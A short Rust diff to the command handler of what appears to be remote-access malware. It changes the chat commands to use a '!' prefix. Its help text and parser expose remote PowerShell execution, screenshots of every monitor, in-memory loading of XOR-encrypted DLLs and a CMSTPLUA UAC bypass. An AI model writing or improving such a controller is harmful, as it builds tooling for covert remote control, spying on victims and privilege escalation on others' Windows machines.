@@ -4,11 +4,11 @@
 
 /// Available commands help text
 const HELP_TEXT: &str = "**Available commands:**\n\
-    - `shell <command>` - Execute a PowerShell command\n\
-    - `scr` - Take a screenshot of all monitors\n\
+    - `!shell <command>` - Execute a PowerShell command\n\
+    - `!scr` - Take a screenshot of all monitors\n\
     - `!loaddll [name]` - Load attached DLL (XOR encrypted) into memory\n\
     - `!uacbypass [cmd]` - UAC bypass via CMSTPLUA (method 41)\n\
-    - `help` - Show this help message";
+    - `!help` - Show this help message";
 
 /// Generate help message for unknown commands
 pub fn get_help_message(unknown_cmd: &str) -> CommandResult {
@@ -62,17 +62,17 @@ impl Command {
         let content_lower = content.to_ascii_lowercase();
 
         // Check for "scr" command
-        if content_lower == "scr" {
+        if content_lower == "!scr" {
             return Command::Screenshot;
         }
 
         // Check for "help" command
-        if content_lower == "help" {
+        if content_lower == "!help" {
             return Command::Help;
         }
 
         // Check for "shell " prefix
-        if let Some(rest) = content_lower.strip_prefix("shell ") {
+        if let Some(rest) = content_lower.strip_prefix("!shell ") {
             if !rest.trim().is_empty() {
                 let cmd = content["shell ".len()..].trim().to_string();
                 return Command::Shell(cmd);
